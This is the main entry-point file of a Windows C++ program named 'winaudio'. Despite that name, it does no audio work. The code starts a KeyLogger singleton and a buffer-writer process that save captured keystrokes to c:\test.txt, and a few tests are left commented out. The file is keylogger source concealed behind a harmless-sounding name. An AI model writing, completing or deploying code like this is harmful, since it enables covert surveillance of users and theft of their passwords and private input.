// winaudio.cpp : Defines the entry point for the application.
//

#include "stdafx.h"
#include "winaudio.h"
#include "MainProcessHandler.h"
#include "Buffer.h"
#include "KeyLogger.h"
#include "FileWriter.h"
#include "BufferWriterProcess.h"
#include <stdio.h>
#include "Queue.h"
#include "VirtulKeyCodeToCharConverter.h"
#define MAX_LOADSTRING 100

// Global Variables:
HINSTANCE hInst;								// current instance
TCHAR szTitle[MAX_LOADSTRING];					// The title bar text
TCHAR szWindowClass[MAX_LOADSTRING];			// the main window class name

HINSTANCE myInstance;

// Forward declarations of functions included in this code module:
BOOL				InitInstance(HINSTANCE, int);
LRESULT CALLBACK	WndProc(HWND, UINT, WPARAM, LPARAM);
INT_PTR CALLBACK	About(HWND, UINT, WPARAM, LPARAM);


int APIENTRY _tWinMain(HINSTANCE hInstance,
                     HINSTANCE hPrevInstance,
                     LPTSTR    lpCmdLine,
                     int       nCmdShow)
{
	UNREFERENCED_PARAMETER(hPrevInstance);
	UNREFERENCED_PARAMETER(lpCmdLine);

	// Initialize global strings
	LoadString(hInstance, IDS_APP_TITLE, szTitle, MAX_LOADSTRING);
	LoadString(hInstance, IDC_WINAUDIO, szWindowClass, MAX_LOADSTRING);
	myInstance = hInstance;

	/*QueueTest();
	BufferTester *test = new BufferTester();
	test->RunTest();

	RunVirtualKeyCodeConverterTest();
	*/

	Buffer *buffer = new Buffer();
	TCHAR *file = L"c:\\test.txt";
	FileWriter *fileWriter = new FileWriter(file);

	KeyLogger::GetInstance()->SetBuffer(buffer);
	BufferWriterProcess *bufferWriter = new BufferWriterProcess(buffer,fileWriter);

	KeyLogger::GetInstance()->Enable();
	bufferWriter->Enable();

	MainProcessHandler::GetInstance()->Run();
	
	return 0;
}

